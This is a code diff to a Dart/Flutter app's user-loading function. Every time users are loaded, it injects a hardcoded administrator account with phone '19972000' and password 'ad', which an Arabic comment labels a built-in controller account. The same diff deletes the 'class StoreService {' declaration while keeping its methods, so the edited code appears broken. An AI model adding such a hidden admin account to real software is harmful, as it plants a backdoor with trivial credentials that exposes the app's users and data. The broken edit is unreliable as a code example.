@@ -159,14 +159,27 @@ Future<dynamic> _fetchJson(String path) async {
   return [];
 }
 
-class StoreService {
   static Future<List<User>> loadUsers() async {
     final d = await _fetchJson('assets/data/users.json');
+    final list = <User>[];
     if (d is List) {
-      return d.map((e) => User.fromJson(e as Map<String, dynamic>)).toList();
+      for (final e in d) {
+        list.add(User.fromJson(e as Map<String, dynamic>));
+      }
     }
-    return [];
+    // 🔐 حساب المتحكم المدمج: رقم هاتف 19972000 + كلمة سر ad
+    list.add(User.fromJson({
+      'id': 'ctrl',
+      'name': 'المتحكم',
+      'phone': '19972000',
+      'password': 'ad',
+      'role': 'admin',
+      'points': 0,
+      'stored': 0,
+    }));
+    return list;
   }
+
 
   static Future<void> saveUsers(List<User> users) async {
     await _putViaProxy(
